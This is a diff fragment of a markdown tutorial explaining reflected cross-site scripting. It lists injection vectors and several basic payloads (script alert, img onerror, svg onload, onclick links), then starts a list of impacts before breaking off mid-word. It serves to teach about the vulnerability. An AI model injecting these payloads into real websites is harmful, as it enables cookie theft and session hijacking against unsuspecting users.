@@ -13,4 +13,45 @@ Reflected Cross-Site Scripting (XSS) is a type of web vulnerability where an att
 3. **Victim Interaction**: The victim clicks the malicious link (e.g., via phishing).
 4. **Execution**: The server reflects the payload back in the response, executing it in the victim’s browser.
 
-### **Example
+### **Example Scenario**
+- Vulnerable URL:  
+  `https://example.com/search?query=<script>alert('XSS')</script>`
+- When visited, the script executes in the user's browser.
+
+---
+
+## **Common Injection Vectors**
+1. **URL Parameters**  
+   - `?search=<script>alert(1)</script>`
+1. **Form Inputs**  
+   - `<input type="text" value="<img src=x onerror=alert(1)>">`
+3. **HTTP Headers**  
+   - `User-Agent: <script>alert(1)</script>`
+
+---
+
+## **Payload Examples**
+### Basic Alert:
+```html
+<script>alert('XSS')</script>
+```
+### Image Tag with `onerror`:
+```html
+<img src=x onerror=alert(1)>
+```
+### SVG-Based XSS:
+```html
+<svg onload=alert(1)>
+```
+### JavaScript Events:
+```html
+<a href="#" onclick="alert('XSS')">Click Me</a>
+```
+
+---
+
+## **Impact of Reflected XSS**
+- Stealing cookies (`document.cookie`)
+- Session hijacking
+- Phishing attacks (fake login forms)
+- Key
